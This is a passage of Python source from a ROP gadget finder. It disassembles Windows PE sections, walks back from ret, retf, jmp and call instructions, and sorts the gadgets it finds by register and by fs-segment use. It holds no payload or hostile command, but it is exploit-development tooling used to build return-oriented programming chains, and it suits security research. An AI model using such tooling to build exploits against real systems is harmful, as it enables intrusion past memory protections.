			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.andInstRCX)
		elif re.match( r'^and [er]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.andInstRDX)
		elif re.match( r'^and [er]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.andInstRSI)
		elif re.match( r'^and [er]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.andInstRDI)
		elif re.match( r'and [er]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.andInstRSP)
		elif re.match( r'^and [er]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.andInstRBP)
		elif re.match( r'^and r8', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r8", fg.andInstR8)
		elif re.match( r'^and r9', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r9", fg.andInstR9)
		elif re.match( r'^and r10', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r10", fg.andInstR10)
		elif re.match( r'^and r11', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r11", fg.andInstR11)
		elif re.match( r'^and r12', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r12", fg.andInstR12)
		elif re.match( r'^and r13', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r13", fg.andInstR13)
		elif re.match( r'^and r14', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r14", fg.andInstR14)
		elif re.match( r'^and r15', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "r15", fg.andInstR15)	

	def do64_unusual(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.unusual64)

	def do64_fs(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do func fs")
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.fs64)
	def do64_go_gs(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do_go_gs")
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.fsSpecial64)

def disHereCall__FSHelper(n, address):
	numBytes=50
	global pe
	# w=0
	
	CODED2 = pe[n].data[(address):(address+numBytes)]
	
	# val6 =[]

	# NOT USING - POSSIBLE FUTRE USE?
	# val3 = []
	# val5 =[]
	# mnemonicL=[]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	# dp (binaryToStr(CODED2))

	for i in cs.disasm(CODED2, address-numBytes):
		# add = hex(int(i.address))
		# addc = hex(int(i.address +  pe[n].VirtualAdd))
		# addb = hex(int(i.address +  pe[n].VirtualAdd))
		# add2 = str(add)
		# add3 = hex (int(i.address + pe[n].startLoc	))
		# add4 = str(add3)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ") " + add + " \n"
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		# val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
		# val6.append(addt)

		# NOT USING - POSSIBLE FUTRE USE?
		# dp (val)

	dp("!!!!!!!!!!!!!!syscall!!!!!!!!!!!!!!!! size", len(val2))

	val2.reverse()
	# try:
	# 	if not re.match( r'ret', val2[0], re.M|re.I):
	# 		return
	# except:
	# 	pass
	offL.reverse()
	mnemonicL.reverse()
	for each in val2:
		dp(each)
	return
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	
	# dp (val2)
	# dp (binaryToStr(CODED2))

	for instruction in val2:
		# hasRet = re.match( r'ret', val2[0], re.M|re.I)
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bretf\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					# if re.match( r'\bpop\b|\bpush\b|\bdec\b|\binc\b|\bxchg\b|\badd\b|\bsub\b|\badc\b|\bsbb\b|\bmul\b|\bimul\b|div|idiv|shr|sar|shl|sal|rcr|ror|rol|rcl|\blea\b|\bxchg\b|\bneg\b|\bxor\b|\bpopa[l|b]+\b|\bpusha[l|d]+\b|mov', val2[lGoBack], re.M|re.I):
					if not c2:
						raw=pe[n].data[offL[lGoBack]:saveq+1]
					else:
						raw=pe[n].data[offL[lGoBack]:saveq+3]		
					rop.do(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False)
					if re.match( r'[a-z ]*fs:|^pop fs:|^push fs:|^mov fs:|^add fs:|^xor fs|^sub fs|xchg fs', val2[lGoBack], re.M|re.I):
						dp("got fs match")
						rop.do_fs(val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL,  op_strL, c2)
				except Exception as e:
					dp("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1
def disHereCallFS(n, address, thirdOp):
	if (thirdOp >=0x20 and thirdOp != 0x24 and thirdOp < 0x28 and thirdOp != 0x25):
		CODED2 = pe[n].data[(address):(address+3)]
	elif (thirdOp >=0x60 and thirdOp < 0x68 and thirdOp != 0x64) or thirdOp == 0x24:
		CODED2 = pe[n].data[(address):(address+4)]
	elif (thirdOp >=0xa0 and thirdOp < 0xa8 and thirdOp != 0xa4) or thirdOp == 0xc0:
		CODED2 = pe[n].data[(address):(address+7)]
	elif thirdOp == 0x25:
		CODED2 = pe[n].data[(address):(address+7)]
	elif (thirdOp == 0xa4):
		CODED2 = pe[n].data[(address):(address+8)]
	else:
		CODED2 = pe[n].data[(address):(address+3)]
		# CODED2 = b"0x90"
		
	# val6 =[]

	# NOT USING - POSSIBLE FUTRE USE?
	# val3 = []
	# val5 =[]
	# mnemonicL=[]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	# dp (binaryToStr(CODED2))

	for i in cs.disasm(CODED2, address):
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

		# NOT USING - POSSIBLE FUTRE USE?
		# dp (val)
	if not val2:
		return 
	if val2:
		dp("special fs one:", address, binaryToStr(pe[n].data[(address):(address+3)]))
		# dp (val2[0])
		dp(val2)

		dp("###########################################################################################")
	else:
		return

	# val2.reverse()
	# offL.reverse()
	# mnemonicL.reverse()
	# rop.do_go_fs(val2[0],saveq, offL,op_strL[0],0, n, CODED2, False)
	# return
	try:
		if re.match( r'jmp dword ptr fs:\[e|jmp dword ptr fs:\[0xc0\]', val2[0], re.M|re.I):
			rop.do_go_fs(val2[0],saveq, offL,op_strL[0],0, n, CODED2, False)
			return
		else:
			return
	except:
		dp("error!!!")
		dp(traceback.format_exc())
				

def disHereJmpCall(n, address,pe):
	CODED2 = pe[n].data[(address):(address+10)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	t=0
	for i in cs.disasm(CODED2, address):
		if t==0:
			mySize=i.size
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	
		t+=1
	if not val2:
		return 
	if val2:
		# dp ("special jmpcall:", address, binaryToStr(pe[n].data[(address):(address+3)]))
		# dp (val2)
		pass
	else:
		return
	CODED3 = pe[n].data[(address):(address+mySize)]

	# dp ("CODED3 dismini")
	# dp(disMini(CODED3,0))
	try:
		if re.match( r'jmp [e|d]+|call [e|d]+', val2[0], re.M|re.I):
			c2="jmp"
			rop.doJmp(mnemonicL[0],val2[0],saveq, offL,op_strL[0],0, n, CODED3,mnemonicL, op_strL, c2)
			return
		else:
			return
	except:
		dp("error!!!")
		dp(traceback.format_exc())


def disHereJmpCall64(n, address,pe):
	CODED2 = pe[n].data[(address):(address+10)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	t=0
	for i in cs64.disasm(CODED2, address):
		if t==0:
			mySize=i.size
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	
		t+=1
	if not val2:
		return 
	if val2:
		pass
	else:
		return
	CODED3 = pe[n].data[(address):(address+mySize)]
	try:
		if re.match( r'jmp [r|e|d]+|call [r|e|d]+', val2[0], re.M|re.I):
			c2="jmp"
			rop.do64Jmp(mnemonicL[0],val2[0],saveq, offL,op_strL[0],0, n, CODED3,mnemonicL, op_strL, c2)
			return
		else:
			return
	except:
		dp("error!!!")
		dp(traceback.format_exc())		
def disHereRetSingle(n, address, numBytes,extraPE=None):
	dp("disHereRetSingle")
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE

	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

	dp ("dr2", val2)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+1]
		rop.do_ret(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		# 
		# rop.do_ret(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		return
def disHereRetSingle64(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE
	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	for i in cs64.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+1]
		rop.do64_ret(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		return

def disHereRetSingleC2(n, address, numBytes,extraPE=None):
	dp("disHereRetSingleC2")
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE

	CODED2 = pe[n].data[(address-numBytes):(address+3)]

	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n" 
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

	# dp ("dr3", val2)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+3]
		rop.do_retC2(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, True) # False for C2
		# 
		# rop.do_ret(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		return	

def disHereRetSingleC264(n, address, numBytes,extraPE=None):
	dp("disHereRetSingleC2")
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE
	CODED2 = pe[n].data[(address-numBytes):(address+3)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs64.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n" 
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+3]
		rop.do64_retC2(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, True) # False for C2
		return
def disHereRet(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	# w=0
	if extraPE != None:
		pe=extraPE

	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	
	# val6 =[]

	# NOT USING - POSSIBLE FUTRE USE?
	# val3 = []
	# val5 =[]
	# mnemonicL=[]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	# dp (binaryToStr(CODED2))
	# dp ("\n\n\n\nnew----")
	for i in cs.disasm(CODED2, address-numBytes):
		# add = hex(int(i.address))
		# addc = hex(int(i.address +  pe[n].VirtualAdd))
		# addb = hex(int(i.address +  pe[n].VirtualAdd))
		# add2 = str(add)
		# add3 = hex (int(i.address + pe[n].startLoc	))
		# add4 = str(add3)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ") " + add + " \n"
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
		# val6.append(addt)

		# NOT USING - POSSIBLE FUTRE USE?
		# dp (val)

	# dp ("###########################################################################################")

	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	op_strL.reverse()
	
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	
	# dp (val2)
	# dp (binaryToStr(CODED2))
	for instruction in val2:
		# hasRet = re.match( r'ret', val2[0], re.M|re.I)
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bretf\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+1]
					vFg=rop.do(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
					# dp ("do1",val2[lGoBack], "mnemonic", mnemonicL[lGoBack], "op_str", op_strL[lGoBack])
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
					dp(traceback.format_exc())

				lGoBack -= 1
		# w+=1
	return vFg

def disHereRet64(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE
	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	for i in cs64.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	op_strL.reverse()
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	# dp (val2)
	# dp (binaryToStr(CODED2))
	for instruction in val2:
		# hasRet = re.match( r'ret', val2[0], re.M|re.I)
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bretf\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+1]
					vFg=rop.do64(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
					# dp ("do1",val2[lGoBack], "mnemonic", mnemonicL[lGoBack], "op_str", op_strL[lGoBack])
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1
		# w+=1
	return vFg

def disHereRetf(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE

	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	
	
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+1]
		rop.doRetfSingle(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		return
	# dp (val2)
	# dp (binaryToStr(CODED2))
	for instruction in val2:
		# hasRet = re.match( r'ret', val2[0], re.M|re.I)
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+1]
					if "push" in val2[lGoBack]:
						rop.doRetf(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1

def disHereRetf64(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE
	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs64.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		if len(val2) ==0:
			return
		pass
	offL.reverse()
	mnemonicL.reverse()
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	if numBytes==0:
		raw=pe[n].data[offL[lGoBack]:saveq+1]
		rop.do64RetfSingle(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
		return
	for instruction in val2:
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+1]
					if "push" in val2[lGoBack]:
						rop.do64Retf(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, False) # False for C2
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1

def disHereRetC2(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	# w=0
	if extraPE != None:
		pe=extraPE

	CODED2 = pe[n].data[(address-numBytes):(address+3)]
	# val6 =[]

	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0
	# dp (binaryToStr(CODED2))

	for i in cs.disasm(CODED2, address-numBytes):
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ") " + add + " \n"
		saveq = int(i.address)
		# val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex(int(i.address + pe[n].startLoc))) + " (offset " + str(hex(int(i.address +  pe[n].VirtualAdd))) + ")\n"# + add + " \n"
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)

	# dp ("###########################################################################################")

	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		pass
	offL.reverse()
	mnemonicL.reverse()
	
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	
	# dp (val2)
	# dp (binaryToStr(CODED2))
	for instruction in val2:
		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bretf\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+3]		
					vFg=rop.do(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, True)   # last True == C2
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1
	return vFg

def disHereRetC264(n, address, numBytes,extraPE=None):
	global pe
	vFg=None
	if extraPE != None:
		pe=extraPE
	CODED2 = pe[n].data[(address-numBytes):(address+3)]

	op_strL=[]
	offL=[]
	val2 = []	
	mnemonicL=[]
	saveq=0

	for i in cs64.disasm(CODED2, address-numBytes):
		saveq = int(i.address)
		val =  i.mnemonic + " " + i.op_str +"\n"   #### RUN THIS ONE FOR PRODUCTION _ FASTER - OTHER JUST FOR TESTING
		offL.append(i.address)
		val2.append(val)
		op_strL.append(i.op_str)
		mnemonicL.append(i.mnemonic)
	val2.reverse()
	try:
		if not re.match( r'ret', val2[0], re.M|re.I):
			return
	except:
		pass
	offL.reverse()
	mnemonicL.reverse()
	# MAKE SURE WE DO NOT EXCEED BOUNDS
	lGoBack = linesGoBackFindOP
	if lGoBack>=len(val2):
		lGoBack=len(val2)-1
	for instruction in val2:
